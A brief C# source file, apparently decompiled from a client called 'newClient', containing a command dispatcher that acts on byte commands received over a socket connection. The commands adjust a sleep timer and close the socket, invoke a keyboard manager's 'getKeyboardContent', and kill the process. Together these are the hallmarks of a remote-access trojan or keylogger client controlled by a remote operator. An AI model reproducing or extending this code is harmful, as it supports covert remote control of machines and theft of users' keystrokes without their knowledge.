using System;
using System.Diagnostics;
using System.Linq;
using newClient.Comms;

namespace newClient.Utilities;

internal class InstructionHelper
{
	internal static void Exec(byte[] bytes)
	{
		switch (bytes[0])
		{
		case 16:
			SocketManger.ModuleSleep = BitConverter.ToInt32(bytes, 1) * 1000;
			SocketManger.SocketModule.socketclose();
			break;
		case 17:
			SocketManger.kkeyboardManagaers.getKeyboardContent(bytes.Skip(1).ToArray());
			break;
		case 18:
			Process.GetCurrentProcess().Kill();
			break;
		}
	}
}
